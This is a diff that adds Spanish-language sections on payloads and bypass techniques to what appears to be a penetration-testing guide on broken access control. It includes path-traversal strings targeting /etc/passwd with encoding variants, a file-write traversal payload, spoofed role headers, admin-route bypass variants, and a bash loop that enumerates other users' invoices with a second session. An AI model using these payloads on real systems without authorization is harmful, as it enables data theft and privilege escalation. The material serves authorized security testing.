@@ -103,6 +103,50 @@ chains_with: [api-abuse, mass-assignment, business-logic]
 - `curl` for precise, scriptable per-ID replay and traversal payload iteration.
 - Source-mapped JS bundle review (manual `grep`) for hidden route discovery.
 
+## Payloads & Detection Patterns
+
+Una familia por superficie de authz. El status distinto (200 vs 403) es un lead; la prueba es el
+**contenido real** recuperado/ejecutado con una sesión que no debería poder.
+
+| Categoría | Shape | Propósito |
+|---|---|---|
+| Direct object ref (horizontal) | `/invoice/1042` replay con sesión de otro user; `seq 1030 1060` | Acceder data de otro user del mismo tier |
+| Forced browsing (vertical) | `/admin/users`, `/admin/export` con sesión low-priv; rutas mineadas del bundle JS | Alcanzar funcionalidad admin-only |
+| Verb/method confusion | `POST`/`PUT`/`PATCH` sobre endpoint que 403 en GET | Dodge de middleware scopeado a un verbo |
+| Path traversal (read) | `?file=../../../../etc/passwd`, `..%2f`, `....//`, `..\\`, `%252f` | Leer fuera del dir intencionado |
+| Path traversal (write) | `{"path":"../../../tmp/poc.txt","content":"poc"}` | Escribir fuera del dir (destructivo → gate operador) |
+| Client-trusted metadata | Header/cookie `X-Role: admin`, `role=admin`, `X-User-Id: 1` | Rol/identidad confiada en el cliente |
+
+Surface signals que delatan la clase antes de probar:
+- Recurso referenciado por ID en URL/body (`/user/55/edit`, `?file=report.pdf`).
+- Elementos UI role-gated ocultos por CSS/JS pero presentes en el DOM/bundle.
+- Feature de descarga/view que toma un filename/path como parámetro.
+- Multi-tenant cuyo aislamiento depende de lógica de app, no de infra.
+- URLs distintas por rol (`/admin/...` vs `/user/...`) que pueden o no compartir el middleware.
+
+```bash
+# sweep horizontal: distinguir 200 (acceso) de 403 (negado) de 404 (inexistente)
+for id in $(seq 1030 1060); do
+  code=$(curl -s -o /tmp/inv_$id -w "%{http_code}" https://target/invoice/$id -b "session=$SESSION_B")
+  echo "$id -> $code"
+done
+grep -l "root:x:0:0" /tmp/inv_*   # confirmar contenido real, no solo el status
+```
+
+## Bypass Techniques
+
+Agrupadas por el control de acceso evadido; probar la familia completa antes de declarar que la
+autorización está bien enforced.
+
+| Filtro evadido | Técnica | Notas |
+|---|---|---|
+| Guard por verbo (GET 403) | Cambiar a POST/PUT/PATCH/HEAD/OPTIONS | Middleware suele scopearse a un método |
+| Guard por prefijo de ruta | `/admin/`, `/Admin`, `//admin`, `/admin/..`, `/admin%20`, encoding | Normalización distinta entre router y guard |
+| Blocklist de traversal literal | `..%2f`, doble-encode `%252f`, `....//`, backslash `..\\` | Validador no canonicaliza antes de comparar |
+| UUID "no enumerable" | Buscar identificador alterno predecible (order no., confirmation code) | El ownership check puede faltar aunque el ID sea random |
+| Allowlist solo en el edge (WAF) | Probar contra el origin directo si está en scope | WAF bloquea, origin sigue vulnerable |
+| Rol confiado client-side | Setear cookie/header de rol (`role=admin`, `X-Role: admin`) | Trust en un valor controlado por el cliente |
+
 ## Root Causes
 
 - Authorization enforced client-side (hidden menu items) with no server-side re-check on the endpoint.
